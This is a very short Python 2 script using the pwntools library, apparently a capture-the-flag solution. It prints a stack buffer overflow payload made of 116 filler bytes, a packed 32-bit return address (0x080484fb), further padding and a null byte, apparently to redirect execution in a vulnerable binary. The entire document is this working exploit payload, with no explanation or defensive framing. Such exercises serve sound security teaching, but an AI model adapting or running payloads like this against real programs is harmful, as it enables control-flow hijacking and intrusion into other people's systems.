from pwn import *

print  "A" * 116 +  p32(0x080484fb) + "A"*(132-116)+ "\x00"
